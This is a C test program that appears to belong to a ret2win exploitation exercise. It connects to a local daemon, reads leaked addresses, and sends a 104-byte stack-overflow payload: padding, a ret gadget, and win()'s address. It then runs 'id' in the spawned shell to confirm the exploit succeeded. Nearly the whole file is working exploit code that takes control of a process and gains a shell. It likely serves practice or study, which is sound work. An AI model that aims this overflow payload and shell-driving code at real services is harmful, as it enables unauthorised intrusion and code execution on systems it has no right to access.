/*
 * sock_test.c -- verify the exploit end-to-end without a pty.
 *
 * Test scaffolding. This speaks the protocol itself: connect, read the banner
 * and leaks, send the same payload fooc would send, then type commands and read
 * replies as raw bytes over the socket. That removes the pty layer entirely, so
 * a failure here is unambiguously the exploit's fault and not the harness's.
 *
 * It deliberately does NOT reuse fooc's payload builders -- it builds the same
 * 88 bytes of 'A' plus win()'s address, plus the alignment `ret`, so that this
 * test and fooc are independent checks of the same idea.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/wait.h>

int main(int argc, char **argv)
{
    struct sockaddr_in sa;
    int fd, port = 2342;
    char rx[4096];
    size_t got = 0;
    unsigned long win_addr, ret_gadget = 0x40101a;
    unsigned char payload[128];
    const char *marker = "SOCK-OK";
    pid_t pid;

    /* win()'s address, passed in so this test does not duplicate the
     * disassembler that fooc already implements. */
    if (argc < 2) { fprintf(stderr, "usage: sock_test <win_addr_hex> [port]\n"); return 2; }
    win_addr = strtoul(argv[1], NULL, 0);
    if (argc > 2) port = atoi(argv[2]);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror("connect"); return 1; }

    /* Read the banner and the leak lines. */
    while (got < sizeof(rx) - 1) {
        ssize_t n = read(fd, rx + got, sizeof(rx) - 1 - got);
        if (n <= 0) break;
        got += (size_t)n;
        if (strstr(rx, "BUF=")) break;
    }
    rx[got] = 0;
    printf("--- banner ---\n%s--------------\n", rx);

    /* 88 bytes of padding, then the alignment `ret`, then win(). */
    memset(payload, 0x41, 88);
    memcpy(payload + 88, &ret_gadget, 8);
    memcpy(payload + 96, &win_addr, 8);
    if (write(fd, payload, 104) != 104) { perror("write"); return 1; }
    printf("sent 104 bytes; win=%#lx\n", win_addr);

    /* Give the daemon time to run win() and fork+exec the shell. */
    usleep(700000);

    /* Type commands as raw bytes, exactly as a real attacker would. */
    dprintf(fd, "id; echo %s; exit\n", marker);

    /* Collect the reply. */
    got = 0;
    for (int i = 0; i < 30 && !strstr(rx, marker); i++) {
        ssize_t n;
        struct timeval tv = { 0, 200000 };
        fd_set fds;
        FD_ZERO(&fds); FD_SET(fd, &fds);
        if (select(fd + 1, &fds, NULL, NULL, &tv) <= 0) continue;
        n = read(fd, rx + got, sizeof(rx) - 1 - got);
        if (n <= 0) break;
        got += (size_t)n;
        rx[got] = 0;
    }

    printf("--- reply ---\n%s--------------\n", rx);
    int ok = strstr(rx, marker) != NULL;
    printf("[sock_test] marker: %s\n", ok ? "SEEN" : "MISSING");

    close(fd);
    (void)pid; (void)waitpid;
    return ok ? 0 : 1;
}
